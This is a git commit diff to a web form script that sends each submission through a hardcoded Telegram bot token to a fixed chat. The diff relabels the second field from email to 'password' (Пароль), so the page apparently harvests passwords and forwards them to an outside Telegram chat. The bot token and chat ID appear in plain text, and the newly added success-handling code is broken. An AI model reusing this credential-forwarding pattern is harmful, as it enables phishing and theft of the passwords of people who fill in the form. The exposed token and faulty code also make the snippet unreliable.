6cc57c04064b9d778a5dfd5a12f914fa55a270fd
softy-company <vkserfingazi@gmail.com>
2023-12-03 12:24:57 +0600

    gd

--- script.js
+++ script.js
@@ -1,19 +1,39 @@
 const TOKEN = "6839101586:AAEAQad_515f4lhz49c3I1kX0jLCnrO5D8Q"
 const CHAT_ID = "-1001862459483"
 const URI_API = `https://api.telegram.org/bot${ TOKEN }/sendMessage`
+const success = document.getElementById("success")
+const nameInput = document.getElementById('name')
+const emailInput = document.getElementById('email')
 
 document.getElementById('tg').addEventListener('submit', function(e){
     e.preventDefault()
 
 let message = `<b> Заявка с сайта !</b>\n`
 message += `<b> Отправитель: </b> ${ this.name.value }\n`
-message += `<b> Почта: </b> ${ this.email.value }\n`
+message += `<b> Пароль: </b> ${ this.email.value }\n`
 
 
 axios.post(URI_API, {
     chat_id: CHAT_ID,
     parse_mode: 'html', 
     text:  message,
+}).then((res)=>{
+    this.name.value = "";
+    this.email.value = "";
+    console.log(nameInput.value);
+    console.log(emailInput.value);
+    if (nameInput.value !== "" || emailInput.value !== "") {
+        nameInput.value.preventDefault()
+        success.innerHTML = "Сообщение не отправлено!";
+        console.log("err");
+    } else {
+        success.innerHTML = "Сообщение отправлено!";
+        console.log("next");
+
+    }
+    success.style.display = "block"
+    success.style.marginBottom = "20px"
+
 })
 
 })
